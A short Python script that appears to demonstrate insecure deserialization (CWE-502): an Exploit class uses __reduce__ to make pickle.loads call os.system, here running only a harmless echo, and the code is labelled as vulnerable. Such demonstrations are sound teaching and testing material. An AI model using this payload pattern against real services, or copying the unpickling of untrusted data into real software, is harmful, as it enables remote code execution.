import pickle
import base64
import os

# Simulate receiving a serialized object from an untrusted source
# This could be from a network request, a file, etc.
class Exploit:
    def __reduce__(self):
        return (os.system, ('echo "pwned by insecure deserialization"',))

# Malicious payload
malicious_payload = pickle.dumps(Exploit())
encoded_payload = base64.b64encode(malicious_payload)

# --- VULNERABLE CODE ---
# An attacker provides the `encoded_payload`
data_from_user = base64.b64decode(encoded_payload)
deserialized_object = pickle.loads(data_from_user) # CWE-502: Deserialization of Untrusted Data
# -----------------------

print(f"Deserialized object: {deserialized_object}")
